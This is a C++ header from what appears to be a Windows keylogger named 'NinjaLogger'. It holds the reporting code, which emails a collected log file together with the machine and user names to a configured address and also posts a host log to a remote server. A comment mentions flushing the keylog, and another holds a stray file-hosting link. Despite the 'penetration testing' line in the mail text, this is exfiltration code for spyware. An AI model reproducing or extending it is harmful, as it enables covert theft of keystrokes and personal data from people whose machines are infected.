#ifndef REPORTLOG_H
#define REPORTLOG_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "Timer.h"
#include "SendMail.h"
#include "Helper.h"
#include "HTTPPost.h"
#include "config.h"

void SendLogMail();


//Mail::MailInstance MailHandlerReport;

void SendLogMail()
{
    //attempt to send email every 2 minutes, normally 12 hours? or 2 hours, etc
    //check if anything was recorded in the keylog string, else no point to do anything

    if(CONFIG_DICT["EMAIL_ENABLED"] == "FALSE") return;

    std::string last_file1 = IO::GetOurPath(true) + "AppLog.txt"; //write to log

    if(last_file1.empty())
    {
        //implement encryption myself
        //write it to the debug log - file creation was not successful
        Helper::WriteAppLog("AppLog Not Found.'");
        return;
    }

    Helper::DateTime currentDT = Helper::DateTime();

    int x = Mail::SendMail("Log [System Report: Program Start] - " + currentDT.GetDateTimeString(),
                           "[From Computer: " + Helper::ToString(getenv("COMPUTERNAME")) + " || User: " + Helper::ToString(getenv("USERNAME")) + "] \n\nHi :) \nThe File has been attached to this mail :) \nFor Penetration Testing Purposes.\n\nYours truly, NinjaLogger",
                           last_file1);

    if(x != 7) //mail sending has failed (7 is the success code)
    {
        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x));
    } else
    {
        Helper::WriteAppLog("Log Mail Successfully sent!");
    }
}

void SendPostStart(){

    if(CONFIG_DICT["SERVER_ENABLED"] == "FALSE") return;

    Helper::DateTime currentDT = Helper::DateTime();

    int x = HTTPPost::SendHostLog();


    if(x != 201) //mail sending has failed (7 is the success code)
    {
        Helper::WriteAppLog("POST was not sent! Error Code: " + Helper::ToString(x));
    } else {
        //flush keyloghttps://1fichier.com/?isdnm6pu2o
        Helper::WriteAppLog("POST START Successfully sent!");
    }
}

void StartSendLogMail()
{
    /*Helper::WriteAppLog(Helper::ToString("Timer for Sending Log Mail Started..."));
    Timer LogMailTimer(SendLogMail, 10000, 1, "Log Mail Timer"); //send 30 seconds in to load
    LogMailTimer.Start();*/
}


#endif // REPORTLOG_H
